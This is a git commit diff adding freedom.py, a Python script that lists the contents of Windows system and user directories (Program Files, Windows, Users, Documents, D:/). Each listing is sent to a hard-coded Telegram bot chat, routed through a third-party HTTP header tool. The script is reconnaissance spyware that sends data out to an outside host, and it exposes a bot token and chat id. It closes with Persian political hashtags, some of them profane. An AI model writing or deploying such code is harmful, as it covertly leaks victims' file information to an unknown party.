b4b90d0177c1f2232558fbaf583811a53a3ff20a
ahura <111840687+mahdigamerpcgk@users.noreply.github.com>
2022-11-24 22:07:21 +0330

    Add files via upload

--- freedom.py
+++ freedom.py
@@ -1,8 +1,8 @@
 import platform
 import requests
 import os
-
-etel =   str(os.listdir())
+###########################################################################################################
+etel =   str(os.listdir("c:/ProgramData"))
 url = ("https://api.telegram.org/bot5140137024:AAG3MXwNbet5I22xQVcxtoL9OTnQ9T3kQY0/sendmessage?chat_id=1104207140&text=" + etel)
 
 drkh = {
@@ -16,21 +16,111 @@ drkh = {
 req = requests.post("https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx",drkh)
 
 print(req)
-
-##########
-it =   str(platform.uname())
-url123 = ("https://api.telegram.org/bot5140137024:AAG3MXwNbet5I22xQVcxtoL9OTnQ9T3kQY0/sendmessage?chat_id=1104207140&text=" + it)
+#####################################################################################sss
+etel1 = str(os.listdir("c:/Program Files"))
+url1 = ("https://api.telegram.org/bot5140137024:AAG3MXwNbet5I22xQVcxtoL9OTnQ9T3kQY0/sendmessage?chat_id=1104207140&text=" + etel1)
 
 drkh1 = {
     
-    "UrlBox":url123,
-    "AgentList":"Opera",
+    "UrlBox":url1,
+    "AgentList":"Internet Explorer",
+    "VersionsList":"HTTP/1.1",
+    "MethodList":"POST"
+}
+req1 = requests.post("https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx",drkh1)
+print(req1)
+############################################################################################################
+etel2 = str(os.listdir("c:/Program Files (x86)"))
+url2 = ("https://api.telegram.org/bot5140137024:AAG3MXwNbet5I22xQVcxtoL9OTnQ9T3kQY0/sendmessage?chat_id=1104207140&text=" + etel2)
+
+drkh2 = {
+    
+    "UrlBox":url2,
+    "AgentList":"Internet Explorer",
+    "VersionsList":"HTTP/1.1",
+    "MethodList":"POST"
+}
+req2 = requests.post("https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx",drkh2)
+print(req2)
+#####################################################################
+etel3 = str(os.listdir("c:/Windows"))
+url3 = ("https://api.telegram.org/bot5140137024:AAG3MXwNbet5I22xQVcxtoL9OTnQ9T3kQY0/sendmessage?chat_id=1104207140&text=" + etel3)
+
+drkh3 = {
+    
+    "UrlBox":url3,
+    "AgentList":"Internet Explorer",
+    "VersionsList":"HTTP/1.1",
+    "MethodList":"POST"
+}
+req3 = requests.post("https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx",drkh3)
+print(req3)
+#####
+etel4 = str(os.listdir("c:/Users"))
+url4 = ("https://api.telegram.org/bot5140137024:AAG3MXwNbet5I22xQVcxtoL9OTnQ9T3kQY0/sendmessage?chat_id=1104207140&text=" + etel4)
+
+drkh4 = {
+    
+    "UrlBox":url4,
+    "AgentList":"Internet Explorer",
+    "VersionsList":"HTTP/1.1",
+    "MethodList":"POST"
+}
+req4 = requests.post("https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx",drkh4)
+print(req4)
+
+#for freedom
+
+etel5 = str(os.listdir("Videos"))
+url5 = ("https://api.telegram.org/bot5140137024:AAG3MXwNbet5I22xQVcxtoL9OTnQ9T3kQY0/sendmessage?chat_id=1104207140&text=" + etel5)
+
+drkh5 = {
+    
+    "UrlBox":url5,
+    "AgentList":"Internet Explorer",
+    "VersionsList":"HTTP/1.1",
+    "MethodList":"POST"
+}
+req5 = requests.post("https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx",drkh5)
+print(req5)
+
+##########################################################################################
+
+etel6 = str(os.listdir("Documents"))
+url6 = ("https://api.telegram.org/bot5140137024:AAG3MXwNbet5I22xQVcxtoL9OTnQ9T3kQY0/sendmessage?chat_id=1104207140&text=" + etel6)
+
+drkh6 = {
+    
+    "UrlBox":url6,
+    "AgentList":"Internet Explorer",
+    "VersionsList":"HTTP/1.1",
+    "MethodList":"POST"
+}
+req6 = requests.post("https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx",drkh6)
+print(req6)
+
+
+######################################for freedom
+etel7 =   str(os.listdir("D:/"))
+url7 = ("https://api.telegram.org/bot5140137024:AAG3MXwNbet5I22xQVcxtoL9OTnQ9T3kQY0/sendmessage?chat_id=1104207140&text=" + etel7)
+
+drkh7 = {
+    
+    "UrlBox":url7,
+    "AgentList":"Internet Explorer",
     "VersionsList":"HTTP/1.1",
     "MethodList":"POST"
 }
 
-req1 = requests.post("https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx",drkh1)
+req7 = requests.post("https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx",drkh7)
 
-print(req1)
-
-
+print(req7)
+#######################################
+#mahsa
+#مهسا_امینی
+#نه_به_جمهموری_اسلامی
+#مرگ_بر_دیکتاتور
+#کیرم_تو_بیت_رهبری
+#ریدم_تو_اسلام
+#by fwldom
+######################################################################################################################
